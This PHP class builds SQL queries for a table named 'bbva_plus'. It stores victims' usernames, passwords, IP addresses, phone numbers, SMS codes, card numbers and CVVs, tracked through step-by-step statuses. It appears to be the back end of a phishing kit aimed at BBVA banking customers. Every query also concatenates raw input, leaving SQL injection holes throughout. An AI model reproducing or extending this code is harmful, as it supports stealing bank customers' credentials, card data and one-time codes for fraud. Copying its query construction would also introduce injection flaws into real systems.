<?php
class User {
    private $table = 'bbva_plus';
    public static $site_id;

    public static function getSiteId() {
        return self::$site_id = $_SERVER['SERVER_NAME'];
    }

    public function getTable() {
        return $this->table;
    }

    public static function sessionTime() {
        if (!isset($_SESSION['time'])) 
        {
            $time = $_SESSION['time'] = rand(00000000, 99999999);
        }else 
        {
            $time = $_SESSION['time'];
        }
        return $time;
    }

    public function getStatus($user_id) {
        return "SELECT status FROM $this->table WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function getUserIp($id) {
        return "SELECT ip FROM $this->table WHERE id = '".$id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function insertUser($user, $pass, $ip, $ua, $user_id, $status, $updatetime) {
        return "INSERT INTO $this->table(site_id, user, pass, ip, ua, time, status, updatetime) VALUES ('".$this->getSiteId()."', '".$user."', '".$pass."', '".$ip."', '".$ua."', '".$user_id."', ".$status.", '".$updatetime."')";
    }

    public function updateUser($user, $pass, $user_id, $status, $updatetime) {
       return "UPDATE $this->table SET user = '".$user."', pass = '".$pass."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function deleteUser($id) {
        return "DELETE FROM $this->table WHERE id = ".$id." AND site_id = '".$this->getSiteId()."'";
    }

    public function updatePhone($phone, $user_id, $status, $updatetime) {
        return "UPDATE $this->table SET phone = '".$phone."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updateSms($sms, $user_id, $status, $updatetime) {
        return "UPDATE $this->table SET sms = '".$sms."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updateCard($card, $user_id, $status, $updatetime) {
        return "UPDATE $this->table SET cc = '".$card."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updateCvv($cvv, $user_id, $status, $updatetime) {
        return "UPDATE $this->table SET cvv = '".$cvv."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function getQcvv($user_id) {
        return "SELECT c_cvv FROM $this->table WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updateQcvv($cvv, $id, $status) {
        return "UPDATE $this->table SET c_cvv = '".$cvv."', status = ".$status." WHERE id = '".$id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updateDesvNumber($desv, $id, $status) {
        $desv = (empty($desv)) ? 'DEFAULT' : $desv;
        return "UPDATE $this->table SET desv_number = '".$desv."', status = ".$status." WHERE id = '".$id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function getDesvNumber($user_id) {
        return "SELECT desv_number FROM $this->table WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }
    
    public function updateDesvResult($desv, $id, $status, $updatetime) {
        return "UPDATE $this->table SET desv_result = '".$desv."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updateStep($id, $step) {
        return "UPDATE $this->table SET status = ".$step." WHERE id = ".$id."";
    }

    public function updateTime($user_id) {
        return "UPDATE $this->table SET updatetime = '".time()."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function clearDb() {
        return "DELETE FROM $this->table WHERE site_id = '".$this->getSiteId()."'";
    }
} 